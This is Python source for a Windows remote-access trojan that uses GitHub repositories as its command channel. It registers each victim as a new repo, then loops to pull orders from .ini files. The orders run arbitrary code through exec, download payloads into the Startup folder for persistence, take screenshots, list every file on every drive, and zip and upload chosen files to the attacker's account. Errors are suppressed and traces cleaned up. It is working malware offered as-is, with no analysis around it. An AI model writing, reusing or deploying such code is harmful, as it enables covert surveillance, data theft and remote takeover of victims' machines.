import base64
import json
import zipfile
from datetime import datetime
from os import fsync, listdir, environ, path, system, mkdir, walk, chdir, getcwd, remove, popen
from shutil import move, copy, copytree
from time import sleep

import git
import pyautogui
import requests
import win32api
from github import Github

# _____(end import)_____ #
TOKEN = 'Token'
chdir(getcwd())
# _____(function)_____ #
try:
    def Rmpydir(FolderName):
        system(fr"rmdir /s /q {FolderName}")


    def Regiter():
        token = "Token"
        Username = popen("whoami").read().strip()
        newUsername = Username.replace("\\", "-")
        userFolder = path.join(getcwd(), newUsername)
        g = Github(token)
        User = g.get_user()
        repo = User.create_repo(newUsername)
        git.Git().clone(f"https://github.com/{User.login}/{newUsername}.git")

        sleep(5)
        files = ["chrome.ini", "code_image.ini", "download_file.ini", "file_path.ini", "file_path.ini",
                 "last_visit.ini",
                 "link.ini", "one_line_commands.ini", "result_condition.ini", "scan_path.ini", "time_sleep.ini"]

        headers = {
            'Authorization': f'token {token}',
            'Accept': 'application/vnd.github.v3+json'
        }

        for file in files:
            filePath = path.join(userFolder, file)
            system(f'copy nul "{filePath}"')
            # ==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-
            if path.join(userFolder, file) == fr"{userFolder}\time_sleep.ini":
                with open(file=fr"{newUsername}\time_sleep.ini", mode="w") as data:
                    data.write("time = 300")

            elif path.join(userFolder, file) == f"{userFolder}\last_visit.ini":
                with open(file=f"{newUsername}/last_visit.ini", mode="w") as data:
                    data.write(f"{str(datetime.now())}")

            elif path.join(userFolder, file) == fr"{userFolder}\result_condition.ini":
                with open(file=f"{newUsername}/result_condition.ini", mode="w") as data:
                    data.write("result_condition = False")

            # ==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-
            with open(filePath, 'r') as f:
                file_content = f.read()
            content = base64.b64encode(file_content.encode()).decode()
            params = {
                'message': 'Add file via API',
                'content': content
            }
            UrlRepo = f"https://api.github.com/repos/{User.login}/{newUsername}"

            try:
                with open(environ['APPDATA'] + fr"\Microsoft\Windows\Start Menu\Programs\info.txt", "w") as data:
                    RepoUrl = UrlRepo.replace("api.github.com/repos", "github.com")
                    data.write("link = " + repr(RepoUrl) + "\n")
                    data.write("Username = " + repr(newUsername))
            except:
                pass
            UrlUploade = UrlRepo + f"/contents/{file}"

            requests.put(UrlUploade, headers=headers, json=params)

        pass


    def download(url: str, dest_folder: str):
        response = requests.get(url, stream=True)
        if response.ok:
            filename = url.split('/')[-1].replace(" ", "_")  # be careful with file names
            file_path = path.join(dest_folder, filename)
            with open(file_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=1024 * 8):
                    if chunk:
                        f.write(chunk), f.flush(), fsync(f.fileno())
        else:  # HTTP status code 4XX/5XX
            pass


    def move_file(path):
        path = environ['APPDATA'] + fr"\Microsoft\Windows\Start Menu\Programs{path}"
        try:
            for i in (listdir("software")):
                move(fr"software\{i}", path)
        except:
            pass


    # __________(deleted)__________#
    # __________(deleted)__________#

    def send_main_information(TOKEN, content, name_file_to_site):
        locals = {}
        with open(file=environ['APPDATA'] + fr"\Microsoft\Windows\Start Menu\Programs\info.txt", mode="r") as data:
            exec(data.read(), globals(), locals)
        link1 = locals["link"]
        Username = locals["Username"]
        sha = requests.get(f"https://api.github.com/repos/ehsanmehran/{Username}/contents/{name_file_to_site}",
                           headers={"Authorization": f"token {TOKEN}"}).json()["sha"]
        content_base64 = base64.b64encode(content.encode()).decode()  # Encode content to Base64
        data = {"content": content_base64, "message": "data", "sha": sha}
        data = json.dumps(data)
        main = requests.put(f"https://api.github.com/repos/ehsanmehran/{Username}/contents/{name_file_to_site}",
                            data=data,
                            headers={"Authorization": f"token {TOKEN}"})

        ########


    def send_file_to_git(TOKEN, content, name_file_to_site):
        locals = {}
        with open(file=environ['APPDATA'] + fr"\Microsoft\Windows\Start Menu\Programs\info.txt", mode="r") as data:
            exec(data.read(), globals(), locals)
        Username = locals["Username"]
        UrlUploade = f"https://api.github.com/repos/ehsanmehran/{Username}/contents/{name_file_to_site}"
        sha = requests.get(UrlUploade, headers={"Authorization": f"token {TOKEN}"}).json()["sha"]
        content_base64 = base64.b64encode(content).decode()

        data = {"content": content_base64, "message": "data", "sha": sha}
        data = json.dumps(data)
        main = requests.put(UrlUploade,
                            data=data,
                            headers={"Authorization": f"token {TOKEN}"})


    def create_zip_from_folder(folder_path, zip_filename):
        # ایجاد یک فایل ZIP جدید
        with zipfile.ZipFile(zip_filename, 'w', compression=zipfile.ZIP_DEFLATED) as new_zip:
            # پیمایش بر روی تمام فایل‌ها و زیرپوشه‌ها در پوشه
            for root, _, files in walk(folder_path):
                for file in files:
                    file_path = path.join(root, file)
                    # اضافه کردن فایل به فایل ZIP
                    new_zip.write(file_path, arcname=path.relpath(file_path, folder_path))
        ########

except:
    pass


def connected_to_internet(url='https://github.com/', timeout=5):
    try:
        _ = requests.head(url, timeout=timeout)
        return _.status_code == 200
    except requests.ConnectionError:
        return False


def main():
    locals = {}
    with open(file=environ['APPDATA'] + fr"\Microsoft\Windows\Start Menu\Programs\info.txt", mode="r") as data:
        exec(data.read(), globals(), locals)
    link = locals["link"]
    Username = locals["Username"]
    if path.exists(Username):
        Rmpydir(Username)
    while connected_to_internet():
        if path.exists(Username):
            Rmpydir(Username)
        if not path.exists(Username):
            git.Git().clone((link))
        if path.exists(f"{Username}/result_condition.ini"):
            config = {}
            with open(file=f"{Username}/result_condition.ini", mode="r") as f:
                exec(f.read(), config)
            result_condition = config['result_condition']
        else:
            sleep(5)
            continue
        if result_condition == "link":
            with open(file=f"{Username}/link.ini", mode="r") as f:
                exec(f.read())
            if not path.exists("software"): mkdir("software")
            download(url=link, dest_folder="software")
            send_main_information(TOKEN=TOKEN, content="result_condition = False",
                                  name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
            move_file("\Startup")
            send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
                                  name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
            Rmpydir(Username)


        elif result_condition == "one_line_commands":
            with open(file=f"{Username}/one_line_commands.ini", mode="r") as f:
                exec(f.read())
            send_main_information(TOKEN=TOKEN, content="result_condition = False",
                                  name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
            send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
                                  name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
            Rmpydir(Username)


        elif result_condition == "camera":
            myscreen = pyautogui.screenshot().save('screen.png')
            with open("screen.png", "rb") as image2string:
                converted_string = base64.b64encode(image2string.read())
            with open('code_image.ini', "wb") as file:
                file.write(converted_string)
            with open(file="code_image.ini", mode="r") as f:
                send_main_information(TOKEN=TOKEN, content=str(f.read()),
                                      name_file_to_site="code_image.ini")  # code_image(TOKEN)
            send_main_information(TOKEN=TOKEN, content="result_condition = False",
                                  name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
            remove("screen.png")
            remove("code_image.ini")
            send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
                                  name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
            Rmpydir(Username)

        elif result_condition == "scan_system":
            if not path.exists("path"):
                mkdir("path")
            else:
                system("rmdir /s /q path")
                mkdir("path")
            drives = win32api.GetLogicalDriveStrings()
            drives = drives.split('\000')[:-1]
            for i in drives:
                if i == "C:\\": i = i + "Users"
                with open(f"path\\{list(i)[0]}.ini", mode="w+", encoding="utf8") as f:
                    for root, dirs, files in walk(i):
                        for file in files:
                            f.write(f"{path.join(root, file)}" + "\n")
            create_zip_from_folder(folder_path="path", zip_filename="path.zip")
            with open("path.zip", "rb") as f:
                with open("path.ini", "wb") as r:
                    r.write(f.read())
                    with open("path.ini", "rb") as f:
                        send_file_to_git(TOKEN=TOKEN, content=f.read(), name_file_to_site="scan_path.ini")
            remove_path = ["path.zip", "path.ini"]
            for i in remove_path:
                remove(i)
            send_main_information(TOKEN=TOKEN, content="result_condition = False",
                                  name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
            send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
                                  name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
            Rmpydir(Username)

        elif result_condition == "send_file":
            if path.exists(fr"{Username}\file_path.ini"):
                with open(file=fr"{Username}\file_path.ini", mode="r", encoding="utf8") as f:
                    exec(f.read())
                if not path.exists('file'): mkdir("file")
                if len(path_file) != 0:
                    for i in path_file:
                        if path.isfile(i):
                            copy(i, r"file")
                        elif path.isdir(i):
                            copytree(i, r"file")
                    create_zip_from_folder("file", "file.zip")
                    with open("file.zip", "rb") as f:
                        with open("file.ini", "wb") as r:
                            r.write(f.read())
                        with open("file.ini", "rb") as f:
                            send_file_to_git(TOKEN=TOKEN, content=f.read(), name_file_to_site="download_file.ini")
            send_main_information(TOKEN=TOKEN, content="result_condition = False",
                                  name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
            send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
                                  name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
            Rmpydir(Username)
            delete = ["file.ini", "file.zip", "file"]
            for i in delete:
                remove(fr"{i}")

        else:
            send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
                                  name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
            if path.exists(f"{Username}\\time_sleep.ini"):
                configTime = {}
                with open(file=f"{Username}\\time_sleep.ini", mode="r", encoding="utf8") as f:
                    exec(f.read(), configTime)
                    time = configTime['time']

                Rmpydir(Username)
                sleep(int(time))
            else:
                sleep(300)
                Rmpydir(Username)


# _____(function)_____#

while True:
    try:
        if path.exists(environ['APPDATA'] + fr"\Microsoft\Windows\Start Menu\Programs\info.txt"):
            main()
        else:
            Regiter()
            main()
    except:
        sleep(5)
        continue
